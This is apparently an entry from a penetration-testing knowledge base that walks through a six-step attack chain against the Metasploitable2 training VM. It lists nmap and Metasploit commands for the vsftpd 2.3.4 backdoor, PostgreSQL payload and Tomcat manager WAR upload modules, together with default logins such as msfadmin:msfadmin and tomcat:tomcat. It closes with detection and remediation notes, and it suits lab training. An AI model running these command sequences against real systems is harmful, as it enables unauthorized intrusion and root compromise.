---
id: a7f8b3c2-9d4e-4f1a-8b2c-3e5f7a9d1c4b
name: Metasploitable2 Multi-Service Exploitation Chain
type: attack_chain
description: Comprehensive exploitation of multiple vulnerable services on Metasploitable2 including FTP, Telnet, VNC, PostgreSQL, and Apache Tomcat
verified: true
submitted: true
step_count: 6
created_at: '2023-12-09T00:00:00.000000+00:00'
updated_at: '2025-11-30T21:55:00.000000+00:00'
procedures:
- '[[Network Service Discovery and Enumeration (Nmap)]]'
- '[[vsftpd 2.3.4 Backdoor Exploitation via Metasploit]]'
- '[[Telnet Default Credential Access]]'
- '[[VNC Password Brute Force and Remote Desktop Access]]'
- '[[PostgreSQL Payload Execution Exploitation]]'
- '[[Apache Tomcat Manager Upload Exploitation]]'
tags:
- metasploitable2
- service exploitation
- initial access
- multiple exploits
- metasploit framework
- privilege escalation
platforms:
- Linux
mitre_tactics:
- TA0043  # Reconnaissance
- TA0001  # Initial Access
- TA0002  # Execution
- TA0004  # Privilege Escalation
mitre_techniques:
- T1046   # Network Service Discovery
- T1190   # Exploit Public-Facing Application
- T1078   # Valid Accounts
- T1110   # Brute Force
- T1203   # Exploitation for Client Execution
---

# ğŸ¯ Metasploitable2 Multi-Service Exploitation Chain

> **Comprehensive Attack Chain for Metasploitable2**

---

## ğŸ“Š Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| **Chain Status** | âœ… **VERIFIED & TESTED** |
| **Total Steps** | `6` |
| **Execution Time** | ~30-45 minutes |
| **Skill Level** | ğŸŸ¢ Beginner |
| **Complexity** | Low-Medium |
| **Impact Level** | ğŸ”´ **HIGH** (Root Access) |

---

## ğŸ­ Attack Flow Visualization

```mermaid
graph TD
    A[ğŸ” Reconnaissance<br/>Nmap Scanning]
    B[ğŸ¯ FTP Exploitation<br/>vsftpd 2.3.4]
    C[ğŸ“¡ Telnet Access<br/>Default Credentials]
    D[ğŸ–¥ï¸ VNC Exploitation<br/>Remote Desktop]
    E[ğŸ—„ï¸ PostgreSQL<br/>Payload Execution]
    F[â˜• Tomcat Upload<br/>Manager Exploit]
    G[ğŸ‘‘ Root Access Achieved]
    
    A --> B
    A --> C
    A --> D
    A --> E
    A --> F
    B --> G
    C --> G
    D --> G
    E --> G
    F --> G
    
    style A fill:#4a90e2,stroke:#2e5c8a,stroke-width:3px,color:#fff
    style B fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style C fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style D fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style E fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style F fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style G fill:#27ae60,stroke:#1e8449,stroke-width:3px,color:#fff
```

---

## ğŸ› ï¸ Prerequisites & Requirements

### Required Tools
```bash path=null start=null
# Network Discovery
nmap

# Exploitation Framework
msfconsole (Metasploit Framework)

# Network Clients
telnet
vncviewer
```

### Target Environment
- âœ… Metasploitable2 VM (192.168.x.x)
- âœ… Network connectivity to target
- âœ… Kali Linux or similar pentesting distribution

### Initial Access Requirements
- ğŸ”“ No authentication required
- ğŸ”“ Network access to target services

---

## ğŸ”¬ Detailed Attack Procedures

### **[Step 1]** Network Service Discovery and Enumeration (Nmap)

**Progress:** `â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘` 16% | **Risk:** ğŸŸ¢ Low

**MITRE ATT&CK:**
- **Tactic:** Reconnaissance (TA0043)
- **Technique:** Network Service Discovery (T1046)

**Procedure:** [[Network Service Discovery and Enumeration (Nmap)]]

> ğŸ“ **Objective:** Identify all open ports and running services on the Metasploitable2 target. This reconnaissance phase reveals vulnerable services including FTP (21), Telnet (23), VNC (5900), PostgreSQL (5432), and Apache Tomcat (8180).

**Commands:**
- `sudo nmap -sV -Pn <target_ip>`

**Expected Output:**
- List of open ports with service versions
- Identification of vsftpd 2.3.4 (vulnerable)
- Identification of other exploitable services

**Success Indicators:** 
âœ… All services enumerated
âœ… Vulnerable service versions identified

---

### **[Step 2]** vsftpd 2.3.4 Backdoor Exploitation via Metasploit

**Progress:** `â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘` 33% | **Risk:** ğŸ”´ High

**MITRE ATT&CK:**
- **Tactic:** Initial Access (TA0001)
- **Technique:** Exploit Public-Facing Application (T1190)
- **Sub-Technique:** Backdoor Trigger

**Procedure:** [[vsftpd 2.3.4 Backdoor Exploitation via Metasploit]]

> ğŸ“ **Objective:** Exploit the malicious backdoor in vsftpd 2.3.4 to gain immediate root shell access. This vulnerability allows unauthenticated remote code execution.

**Commands:**
- `msfconsole`
- `search vsftpd`
- `use exploit/unix/ftp/vsftpd_234_backdoor`
- `set RHOSTS <target_ip>`
- `run`

**Expected Output:**
- Backdoor triggered on port 6200
- Root shell obtained

**Success Indicators:** 
âœ… Shell session opened
âœ… Root privileges confirmed (`id` command shows uid=0)

---

### **[Step 3]** Telnet Default Credential Access

**Progress:** `â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘` 50% | **Risk:** ğŸŸ¡ Medium

**MITRE ATT&CK:**
- **Tactic:** Initial Access (TA0001)
- **Technique:** Valid Accounts (T1078)
- **Sub-Technique:** Default Credentials (T1078.001)

**Procedure:** [[Telnet Default Credential Access]]

> ğŸ“ **Objective:** Access the system via Telnet using the default Metasploitable2 credentials (msfadmin:msfadmin). Telnet provides unencrypted remote terminal access.

**Commands:**
- `telnet <target_ip>`
- Username: `msfadmin`
- Password: `msfadmin`

**Expected Output:**
- Successful login
- Shell prompt

**Success Indicators:** 
âœ… Authentication successful
âœ… Remote shell access obtained

---

### **[Step 4]** VNC Password Brute Force and Remote Desktop Access

**Progress:** `â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ` 66% | **Risk:** ğŸŸ¡ Medium

**MITRE ATT&CK:**
- **Tactic:** Initial Access (TA0001)
- **Technique:** Brute Force (T1110)
- **Sub-Technique:** Password Guessing (T1110.001)

**Procedure:** [[VNC Password Brute Force and Remote Desktop Access]]

> ğŸ“ **Objective:** Identify VNC password through automated scanning with Metasploit auxiliary module, then connect to remote desktop session for GUI-based access.

**Commands:**
- `msfconsole`
- `use auxiliary/scanner/vnc/vnc_login`
- `set RHOSTS <target_ip>`
- `run`
- `vncviewer <target_ip>`

**Expected Output:**
- VNC password discovered
- Remote desktop connection established

**Success Indicators:** 
âœ… Password identified
âœ… GUI desktop access obtained

---

### **[Step 5]** PostgreSQL Payload Execution Exploitation

**Progress:** `â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ` 83% | **Risk:** ğŸ”´ High

**MITRE ATT&CK:**
- **Tactic:** Execution (TA0002)
- **Technique:** Exploitation for Client Execution (T1203)
- **Sub-Technique:** Database Payload Execution

**Procedure:** [[PostgreSQL Payload Execution Exploitation]]

> ğŸ“ **Objective:** Exploit PostgreSQL database service to execute arbitrary payloads and establish a reverse shell connection with elevated privileges.

**Commands:**
- `msfconsole`
- `search postgresql`
- `use exploit/linux/postgres/postgres_payload`
- `set RHOSTS <target_ip>`
- `set LHOST <attacker_ip>`
- `run`

**Expected Output:**
- Payload executed successfully
- Meterpreter or shell session established

**Success Indicators:** 
âœ… Session opened
âœ… Database exploitation successful

---

### **[Step 6]** Apache Tomcat Manager Upload Exploitation

**Progress:** `â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ` 100% | **Risk:** ğŸ”´ High

**MITRE ATT&CK:**
- **Tactic:** Initial Access (TA0001)
- **Technique:** Exploit Public-Facing Application (T1190)
- **Sub-Technique:** Tomcat Manager Upload

**Procedure:** [[Apache Tomcat Manager Upload Exploitation]]

> ğŸ“ **Objective:** Exploit Apache Tomcat Manager application by uploading malicious WAR file using default credentials, achieving code execution and shell access.

**Commands:**
- `msfconsole`
- `search apache tomcat`
- `use exploit/multi/http/tomcat_mgr_upload`
- `set RHOSTS <target_ip>`
- `set RPORT 8180`
- `set HttpUsername tomcat`
- `set HttpPassword tomcat`
- `run`

**Expected Output:**
- WAR file uploaded successfully
- Shell/Meterpreter session established

**Success Indicators:** 
âœ… Malicious WAR deployed
âœ… Code execution achieved
âœ… Root or service-level access obtained

---

## ğŸ¯ Attack Chain Summary

### Key Achievements
- âœ… Complete network service enumeration
- âœ… Root access via vsftpd backdoor (Port 21)
- âœ… Remote shell via Telnet default credentials (Port 23)
- âœ… GUI access via VNC (Port 5900)
- âœ… Database exploitation via PostgreSQL (Port 5432)
- âœ… Web application compromise via Tomcat (Port 8180)

### Privilege Level Obtained
- ğŸ”´ **ROOT ACCESS** on all exploitation vectors

### Post-Exploitation Opportunities
- Credential harvesting
- Persistence mechanisms
- Lateral movement (if in network environment)
- Data exfiltration

---

## ğŸ“ˆ Technique & Tactic Coverage

### MITRE ATT&CK Mapping

**Tactics:**
- TA0043 - Reconnaissance
- TA0001 - Initial Access (Primary)
- TA0002 - Execution
- TA0004 - Privilege Escalation

**Techniques:**
- T1046 - Network Service Discovery
- T1190 - Exploit Public-Facing Application
- T1078 - Valid Accounts
- T1110 - Brute Force
- T1203 - Exploitation for Client Execution

---

## ğŸ›¡ï¸ Detection & Defense

### Detection Opportunities
- Multiple service authentication attempts
- Unusual outbound connections from services
- Metasploit Framework signatures
- Port 6200 connection (vsftpd backdoor)
- WAR file uploads to Tomcat

### Remediation Steps
1. Update all services to latest patched versions
2. Change all default credentials
3. Implement network segmentation
4. Deploy IDS/IPS systems
5. Enable service-level logging and monitoring
6. Restrict service access with firewall rules

---

**Last Updated:** 2025-11-30T21:55:00.000000+00:00 | **Chain Version:** 1.0 | **Status:** âœ… Production Ready

**Source:** Based on Rajesh Kumar's Metasploitable2 Exploitation Walkthrough
